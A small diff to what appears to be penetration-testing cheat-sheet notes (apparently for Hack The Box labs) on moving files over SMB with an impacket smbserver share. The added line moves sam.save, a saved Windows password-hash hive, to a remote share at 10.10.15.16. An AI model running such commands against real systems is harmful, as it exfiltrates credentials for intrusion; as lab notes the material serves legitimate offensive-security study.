@@ -9,6 +9,7 @@ smbserver.py -smb2support -username gust -password guest share /root/htb
 net use x: \\<IP>\share /user:guest <password>
 #Download
 cmd /c "copy file.txt X:\"
+move sam.save \\10.10.15.16\CompData
 ```
 
 
